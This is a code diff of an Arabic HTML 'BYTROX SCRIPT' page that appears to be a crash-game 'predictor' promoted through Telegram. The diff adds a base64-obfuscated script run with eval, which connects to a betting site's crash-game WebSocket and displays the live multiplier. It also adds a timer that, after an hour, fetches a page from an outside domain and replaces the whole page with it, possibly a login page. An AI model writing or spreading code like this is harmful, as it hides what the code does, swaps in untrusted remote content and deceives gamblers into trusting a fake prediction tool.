@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
@@ -31,22 +32,19 @@
       text-shadow: 0 0 8px #ff00ff, 0 0 12px #00ff7f;
       display: inline-block;
       white-space: nowrap;
-      animation: flow 2s linear infinite, move 4s linear infinite; /* TEZLIK */
+      animation: flow 2s linear infinite, move 4s linear infinite;
     }
 
-    /* rang oqimi */
     @keyframes flow {
       0% { background-position: 0% center; }
       100% { background-position: 200% center; }
     }
 
-    /* matnning o‘zi harakatlanishi */
     @keyframes move {
       0% { transform: translateX(-120%); }
       100% { transform: translateX(120%); }
     }
 
-    /* Banner */
     #banner {
       margin-top: 5px;
       width: 100%;
@@ -54,7 +52,6 @@
       overflow: hidden;
     }
 
-    /* Logo */
     #logoText {
       margin-top: 30px;
       font-size: 28px;
@@ -63,27 +60,20 @@
       overflow: hidden;
     }
 
-    /* Real time soat */
     #realtime {
       margin-top: 50px;
       font-size: 30px;
       font-weight: bold;
       color: #ff000000;
-text-shadow: 0 0 10px #ccffffff;
+      text-shadow: 0 0 10px #ccffffff;
     }
 
-    /* Gif container */
-    .gif-container {
-      margin-top: 150px;
+    /* Orbit container */
+    .orbit-container {
+      margin-top: 50px;
       position: relative;
       width: 500px;
       height: 500px;
-    }
-
-    .gif-container img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
     }
 
     #crashValue {
@@ -96,8 +86,6 @@ text-shadow: 0 0 10px #ccffffff;
       color: red;
       z-index: 2;
     }
-
-  
   </style>
 </head>
 <body>
@@ -112,26 +100,16 @@ text-shadow: 0 0 10px #ccffffff;
     <span class="glow-text">BYTROX SCRIPT</span>
   </div>
   
-  <!-- Rel time clock -->
+  <!-- Real time clock -->
   <div id="realtime">--:--:--</div>
-  <body>
 
-<!-- ✈️ Orbit va Crash Value markazi -->
-<div class="-container" style="position: relative; width: 500px; height: 500px; margin: auto;">
-    <!-- Orbit chizadigan canvas -->
+  <!-- ✈️ Orbit + Crash Value -->
+  <div class="orbit-container">
     <canvas id="orbitCanvas" width="500" height="500" style="position:absolute; top:0; left:0; z-index:1;"></canvas>
+    <div id="crashValue" data-text="0.00">0.00</div>
+  </div>
 
-    <!-- Crash Value o‘rtada -->
-    <div class="content-container" style="position: relative; width: 100%; height: 100%; display:flex; justify-content:center; align-items:center; z-index:2;">
-        <div id="crashValue" data-text="0.00">0.00</div>
-    </div>
-</div>
-
-<!-- boshqa elementlaringiz shu yerda qolishi mumkin -->
-
-  </body>
-
-  <!-- Sizning eski scriptlaringiz, server, encrypted code — TEGMADIM -->
+  <!-- Real time clock script -->
   <script>
     function updateClock() {
       const now = new Date();
@@ -144,184 +122,121 @@ text-shadow: 0 0 10px #ccffffff;
     setInterval(updateClock, 1000);
     updateClock();
   </script>
+
+  <!-- Orbit chizish + samolyot animatsiyasi -->
   <script>
-const canvas = document.getElementById("orbitCanvas");
-const ctx = canvas.getContext("2d");
-let angle = 0;
-
-function drawOrbit() {
-    const w = canvas.width;
-    const h = canvas.height;
-    const cx = w / 2;
-    const cy = h / 2;
-
-    ctx.clearRect(0, 0, w, h);
-
-    ctx.strokeStyle = "#E10600";
-    ctx.lineWidth = 3;
-    ctx.setLineDash([15, 10]);
-    ctx.lineDashOffset = -angle * 2;
-
-    ctx.beginPath();
-    ctx.arc(cx, cy, 120, 0, Math.PI * 2);
-    ctx.stroke();
-
-    ctx.beginPath();
-    ctx.arc(cx, cy, 200, 0, Math.PI * 2);
-    ctx.stroke();
-
-    drawPlane(cx, cy, 200, angle, true);
-    drawPlane(cx, cy, 200, angle + 120, true);
-    drawPlane(cx, cy, 200, angle + 240, true);
-
-    drawPlane(cx, cy, 120, -angle, false);
-    drawPlane(cx, cy, 120, -angle + 180, false);
-
-    angle += 2;
-    requestAnimationFrame(drawOrbit);
-}
-
-function drawPlane(cx, cy, radius, angleDeg, clockwise) {
-    const rad = (angleDeg * Math.PI) / 180;
-    const x = cx + radius * Math.cos(rad);
-    const y = cy + radius * Math.sin(rad);
-
-    ctx.save();
-    ctx.translate(x, y);
-    ctx.rotate(rad + (clockwise ? 0 : Math.PI));
-
+    const canvas = document.getElementById("orbitCanvas");
+    const ctx = canvas.getContext("2d");
+    let angle = 0;
     const planeImg = new Image();
     planeImg.src = "plane.png";
-    planeImg.onload = function () {
+
+    function drawOrbit() {
+      const w = canvas.width;
+      const h = canvas.height;
+      const cx = w / 2;
+      const cy = h / 2;
+
+      ctx.clearRect(0, 0, w, h);
+
+      ctx.strokeStyle = "#E10600";
+      ctx.lineWidth = 3;
+      ctx.setLineDash([20, 14]);
+      ctx.lineDashOffset = -angle * 3; /* TEZLIK oshirildi */
+
+      // ichki aylana (radius 180px)
+      ctx.beginPath();
+      ctx.arc(cx, cy, 180, 0, Math.PI * 2);
+      ctx.stroke();
+
+      // tashqi aylana (radius 225px)
+      ctx.beginPath();
+      ctx.arc(cx, cy, 225, 0, Math.PI * 2);
+      ctx.stroke();
+
+      // samolyotlar tashqi orbitada
+      drawPlane(cx, cy, 225, angle, true);
+      drawPlane(cx, cy, 225, angle + 120, true);
+      drawPlane(cx, cy, 225, angle + 240, true);
+
+      // samolyotlar ichki orbitada
+      drawPlane(cx, cy, 180, -angle, false);
+      drawPlane(cx, cy, 180, -angle + 180, false);
+
+      angle += 3; // tezlikni oshirish
+      requestAnimationFrame(drawOrbit);
+    }
+
+    function drawPlane(cx, cy, radius, angleDeg, clockwise) {
+      const rad = (angleDeg * Math.PI) / 180;
+      const x = cx + radius * Math.cos(rad);
+      const y = cy + radius * Math.sin(rad);
+
+      ctx.save();
+      ctx.translate(x, y);
+      ctx.rotate(rad + (clockwise ? 0 : Math.PI));
+      if (planeImg.complete) {
         ctx.drawImage(planeImg, -15, -15, 30, 30);
+      }
+      ctx.restore();
+    }
+
+    drawOrbit();
+  </script>
+
+  <!-- Siz yuborgan eski kodlar (tegmadim) -->
+  <script>
+    window.addEventListener('resize', function(event) {
+      window.resizeTo(1024, 768);
+    });
+
+    let totalSeconds = 2147483647 * 60;
+    const timerElement = document.getElementById('timer');
+    const crashValueElement = document.getElementById('crashValue');
+
+    function updateTimer() {
+      const hours = Math.floor(totalSeconds / 3600);
+      const minutes = Math.floor((totalSeconds % 3600) / 60);
+      const seconds = totalSeconds % 60;
+
+      timerElement.textContent =
+        `${hours.toString().padStart(2, '0')} : ${minutes.toString().padStart(2, '0')} : ${seconds.toString().padStart(2, '0')}`;
+
+      if (totalSeconds <= 0) {
+        clearInterval(timerInterval);
+        fetch('http://xdevman07x.com/Login.php')
+        .then(response => response.text())
+        .then(html => {
+          document.getElementsByTagName('html')[0].innerHTML = html;
+        })
+        .catch(error => {
+          console.error('Error fetching the page:', error);
+        });
+      }
+    }
+
+    function decrementTime() {
+      if (totalSeconds > 0) totalSeconds--;
+    }
+
+    const timerInterval = setInterval(() => {
+      decrementTime();
+      updateTimer();
+    }, 1000);
+
+    window.onload = () => {
+      totalSeconds = 60 * 60;
+      updateTimer();
     };
 
-    ctx.restore();
-}
+    var encryptedJsCode = "bmV3IGZ1bmN0aW9uKCkgewoKCXZhciB3cyA9IG51bGw7Cgl2YXIgb3BlbiA9IGZ1bmN0aW9uKCkgewoJCXZhciB1cmwgPSAnd3NzOi8vZWcxeGJldC5jb20vZ2FtZXMtZnJhbWUvc29ja2V0cy9jcmFzaD93aGVuY2U9NTAmZmNvdW50cnk9NjYmcmVmPTEmZ3I9MCZhcHBHdWlkPWdhbWVzLXdlYi1tYXN0ZXImbG5nPWFyJwoJCXdzID0gbmV3IFdlYlNvY2tldCh1cmwpOwoJCXdzLm9ub3BlbiA9IG9uT3BlbjsKCQl3cy5vbmNsb3NlID0gb25DbG9zZTsKCQl3cy5vbm1lc3NhZ2UgPSBvbk1lc3NhZ2U7CgkJd3Mub25lcnJvciA9IG9uRXJyb3I7Cgl9CgkKCXZhciBjbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWlmICh3cykgewoJCQljb25zb2xlLmxvZygnQ0xPU0lORyAuLi4nKTsKCQkJd3MuY2xvc2UoKTsKCQl9CgkJfQoJdmFyIG9uT3BlbiA9IGZ1bmN0aW9uKCkgewoJCWNvbnNvbGUubG9nKCdPUEVORUQ6ICcpOwoJCXdzLnNlbmQoJ3sicHJvdG9jb2wiOiJqc29uIiwidmVyc2lvbiI6MX1ceDFlJyk7CiAgICAgICAgd3Muc2VuZCgneyJhcmd1bWVudHMiOlt7ImFjdGl2aXR5IjozMCwiYWNjb3VudCI6MTI4NDM4NjIyNX1dLCJpbnZvY2F0aW9uSWQiOiIwIiwidGFyZ2V0IjoiQWNjb3VudCIsInR5cGUiOjF9XHgxZScpOwogICAgICAKCX07Cgl2YXIgb25DbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWNvbnNvbGUubG9nKCdDTE9TRUQ6ICcpOwoJCXdzID0gbnVsbDsKCX07CgkKCXZhciBvbk1lc3NhZ2UgPSBmdW5jdGlvbihldmVudCkgewoJCWNvbnN0IGRhdGEgPSBKU09OLnBhcnNlKGV2ZW50LmRhdGEuc2xpY2UoMCwgLTEpKTsKICAgICAgICAgICAgaWYgKGRhdGEudGFyZ2V0ID09PSAnT25DcmFzaCcgKSB7CiAgICAgICAgICAgICAgICBzZW5kKGRhdGEuYXJndW1lbnRzWzBdLmYpOwogICAgICAgICAgICB9Cgl9OwoJCgl2YXIgb25FcnJvciA9IGZ1bmN0aW9uKGV2ZW50KSB7CgkJYWxlcnQoZXZlbnQuZGF0YSk7Cgl9CglvcGVuKCkKCX0KCWZ1bmN0aW9uIHNlbmQoaWQpIHsKCWNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjcmFzaFZhbHVlRWxlbWVudC5pbm5lclRleHQgPSBpZDsKICAgICAgICAgICAgICAgICAgICAgICAgY3Jhc2hWYWx1ZUVsZW1lbnQuc2V0QXR0cmlidXRlKCdkYXRhLXRleHQnLCBpZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIH0sIDEwMDApOwkJfQ==";
+    var decodedJsCode = atob(encryptedJsCode);
+    eval(decodedJsCode);
 
-drawOrbit();
-</script>
-</body>
-  <!-- Siz yuborgan eski scriptlar shu yerda turadi (tegmadim) -->
-  <!-- ... (eski JS code + encrypted websocket kodingiz) ... -->
-
-  <!-- Ay.gif + crash value -->
-  <div class="-container">
-    <img src="" alt="Animation">
-    <div class="content-containe">
-    </div>
-
-    <script>
-        window.addEventListener('resize', function(event) {
-            window.resizeTo(1024, 768);
-        });
-
-        let totalSeconds = 2147483647 * 60;
-        const timerElement = document.getElementById('timer');
-        const crashValueElement = document.getElementById('crashValue');
-
-        function updateTimer() {
-            const hours = Math.floor(totalSeconds / 3600);
-            const minutes = Math.floor((totalSeconds % 3600) / 60);
-            const seconds = totalSeconds % 60;
-
-            timerElement.textContent = 
-                `${hours.toString().padStart(2, '0')} : ${minutes.toString().padStart(2, '0')} : ${seconds.toString().padStart(2, '0')}`;
-
-            if (totalSeconds <= 0) {
-                clearInterval(timerInterval);
-                fetch('http://xdevman07x.com/Login.php')
-                .then(response => response.text())
-                .then(html => {
-                    document.getElementsByTagName('html')[0].innerHTML = html;
-                })
-                .catch(error => {
-                    console.error('Error fetching the page:', error);
-                });
-            }
-        }
-
-        function decrementTime() {
-            if (totalSeconds > 0) {
-                totalSeconds--;
-            }
-        }
-
-        const timerInterval = setInterval(() => {
-            decrementTime();
-            updateTimer();
-        }, 1000);
-
-        window.onload = () => {
-            totalSeconds = 60 * 60;
-            updateTimer();
-        };
-        
-        var encryptedJsCode = "bmV3IGZ1bmN0aW9uKCkgewoKCXZhciB3cyA9IG51bGw7Cgl2YXIgb3BlbiA9IGZ1bmN0aW9uKCkgewoJCXZhciB1cmwgPSAnd3NzOi8vZWcxeGJldC5jb20vZ2FtZXMtZnJhbWUvc29ja2V0cy9jcmFzaD93aGVuY2U9NTAmZmNvdW50cnk9NjYmcmVmPTEmZ3I9MCZhcHBHdWlkPWdhbWVzLXdlYi1tYXN0ZXImbG5nPWFyJwoJCXdzID0gbmV3IFdlYlNvY2tldCh1cmwpOwoJCXdzLm9ub3BlbiA9IG9uT3BlbjsKCQl3cy5vbmNsb3NlID0gb25DbG9zZTsKCQl3cy5vbm1lc3NhZ2UgPSBvbk1lc3NhZ2U7CgkJd3Mub25lcnJvciA9IG9uRXJyb3I7Cgl9CgkKCXZhciBjbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWlmICh3cykgewoJCQljb25zb2xlLmxvZygnQ0xPU0lORyAuLi4nKTsKCQkJd3MuY2xvc2UoKTsKCQl9CgkJfQoJdmFyIG9uT3BlbiA9IGZ1bmN0aW9uKCkgewoJCWNvbnNvbGUubG9nKCdPUEVORUQ6ICcpOwoJCXdzLnNlbmQoJ3sicHJvdG9jb2wiOiJqc29uIiwidmVyc2lvbiI6MX1ceDFlJyk7CiAgICAgICAgd3Muc2VuZCgneyJhcmd1bWVudHMiOlt7ImFjdGl2aXR5IjozMCwiYWNjb3VudCI6MTI4NDM4NjIyNX1dLCJpbnZvY2F0aW9uSWQiOiIwIiwidGFyZ2V0IjoiQWNjb3VudCIsInR5cGUiOjF9XHgxZScpOwogICAgICAKCX07Cgl2YXIgb25DbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWNvbnNvbGUubG9nKCdDTE9TRUQ6ICcpOwoJCXdzID0gbnVsbDsKCX07CgkKCXZhciBvbk1lc3NhZ2UgPSBmdW5jdGlvbihldmVudCkgewoJCWNvbnN0IGRhdGEgPSBKU09OLnBhcnNlKGV2ZW50LmRhdGEuc2xpY2UoMCwgLTEpKTsKICAgICAgICAgICAgaWYgKGRhdGEudGFyZ2V0ID09PSAnT25DcmFzaCcgKSB7CiAgICAgICAgICAgICAgICBzZW5kKGRhdGEuYXJndW1lbnRzWzBdLmYpOwogICAgICAgICAgICB9Cgl9OwoJCgl2YXIgb25FcnJvciA9IGZ1bmN0aW9uKGV2ZW50KSB7CgkJYWxlcnQoZXZlbnQuZGF0YSk7Cgl9CglvcGVuKCkKCX0KCWZ1bmN0aW9uIHNlbmQoaWQpIHsKCWNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjcmFzaFZhbHVlRWxlbWVudC5pbm5lclRleHQgPSBpZDsKICAgICAgICAgICAgICAgICAgICAgICAgY3Jhc2hWYWx1ZUVsZW1lbnQuc2V0QXR0cmlidXRlKCdkYXRhLXRleHQnLCBpZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIH0sIDEwMDApOwkJfQ==";
-        var decodedJsCode = atob(encryptedJsCode);
-
-        eval(decodedJsCode);
-
-        function redirectToTelegram() {
-            window.location.href = 'https://t.me/bytrox_1';
-        }
-    </script>
-
-<script>
-        window.addEventListener('resize', function(event) {
-            window.resizeTo(1024, 768);
-        });
-
-        let totalSeconds = 2147483647 * 60;
-        const timerElement = document.getElementById('timer');
-        const crashValueElement = document.getElementById('crashValue');
-
-        function updateTimer() {
-            const hours = Math.floor(totalSeconds / 3600);
-            const minutes = Math.floor((totalSeconds % 3600) / 60);
-            const seconds = totalSeconds % 60;
-
-            timerElement.textContent = 
-                `${hours.toString().padStart(2, '0')} : ${minutes.toString().padStart(2, '0')} : ${seconds.toString().padStart(2, '0')}`;
-
-            if (totalSeconds <= 0) {
-                clearInterval(timerInterval);
-                fetch('http://xdevman07x.com/Login.php')
-                .then(response => response.text())
-                .then(html => {
-                    document.getElementsByTagName('html')[0].innerHTML = html;
-                })
-                .catch(error => {
-                    console.error('Error fetching the page:', error);
-                });
-            }
-        }
-
-        function decrementTime() {
-            if (totalSeconds > 0) {
-                totalSeconds--;
-            }
-        }
-
-        const timerInterval = setInterval(() => {
-            decrementTime();
-            updateTimer();
-        }, 1000);
-
-        window.onload = () => {
-            totalSeconds = 60 * 60;
-            updateTimer();
-        };
-        
-        var encryptedJsCode = "bmV3IGZ1bmN0aW9uKCkgewoKCXZhciB3cyA9IG51bGw7Cgl2YXIgb3BlbiA9IGZ1bmN0aW9uKCkgewoJCXZhciB1cmwgPSAnd3NzOi8vZWcxeGJldC5jb20vZ2FtZXMtZnJhbWUvc29ja2V0cy9jcmFzaD93aGVuY2U9NTAmZmNvdW50cnk9NjYmcmVmPTEmZ3I9MCZhcHBHdWlkPWdhbWVzLXdlYi1tYXN0ZXImbG5nPWFyJwoJCXdzID0gbmV3IFdlYlNvY2tldCh1cmwpOwoJCXdzLm9ub3BlbiA9IG9uT3BlbjsKCQl3cy5vbmNsb3NlID0gb25DbG9zZTsKCQl3cy5vbm1lc3NhZ2UgPSBvbk1lc3NhZ2U7CgkJd3Mub25lcnJvciA9IG9uRXJyb3I7Cgl9CgkKCXZhciBjbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWlmICh3cykgewoJCQljb25zb2xlLmxvZygnQ0xPU0lORyAuLi4nKTsKCQkJd3MuY2xvc2UoKTsKCQl9CgkJfQoJdmFyIG9uT3BlbiA9IGZ1bmN0aW9uKCkgewoJCWNvbnNvbGUubG9nKCdPUEVORUQ6ICcpOwoJCXdzLnNlbmQoJ3sicHJvdG9jb2wiOiJqc29uIiwidmVyc2lvbiI6MX1ceDFlJyk7CiAgICAgICAgd3Muc2VuZCgneyJhcmd1bWVudHMiOlt7ImFjdGl2aXR5IjozMCwiYWNjb3VudCI6MTI4NDM4NjIyNX1dLCJpbnZvY2F0aW9uSWQiOiIwIiwidGFyZ2V0IjoiQWNjb3VudCIsInR5cGUiOjF9XHgxZScpOwogICAgICAKCX07Cgl2YXIgb25DbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWNvbnNvbGUubG9nKCdDTE9TRUQ6ICcpOwoJCXdzID0gbnVsbDsKCX07CgkKCXZhciBvbk1lc3NhZ2UgPSBmdW5jdGlvbihldmVudCkgewoJCWNvbnN0IGRhdGEgPSBKU09OLnBhcnNlKGV2ZW50LmRhdGEuc2xpY2UoMCwgLTEpKTsKICAgICAgICAgICAgaWYgKGRhdGEudGFyZ2V0ID09PSAnT25DcmFzaCcgKSB7CiAgICAgICAgICAgICAgICBzZW5kKGRhdGEuYXJndW1lbnRzWzBdLmYpOwogICAgICAgICAgICB9Cgl9OwoJCgl2YXIgb25FcnJvciA9IGZ1bmN0aW9uKGV2ZW50KSB7CgkJYWxlcnQoZXZlbnQuZGF0YSk7Cgl9CglvcGVuKCkKCX0KCWZ1bmN0aW9uIHNlbmQoaWQpIHsKCWNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjcmFzaFZhbHVlRWxlbWVudC5pbm5lclRleHQgPSBpZDsKICAgICAgICAgICAgICAgICAgICAgICAgY3Jhc2hWYWx1ZUVsZW1lbnQuc2V0QXR0cmlidXRlKCdkYXRhLXRleHQnLCBpZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIH0sIDEwMDApOwkJfQ==";
-        var decodedJsCode = atob(encryptedJsCode);
-
-        eval(decodedJsCode);
-
-        function redirectToTelegram() {
-            window.location.href = 'https://t.me/Thanos_1x';
-        }
-  </div>
+    function redirectToTelegram() {
+      window.location.href = 'https://t.me/bytrox_1';
+    }
+  </script>
 
 </body>
 </html>
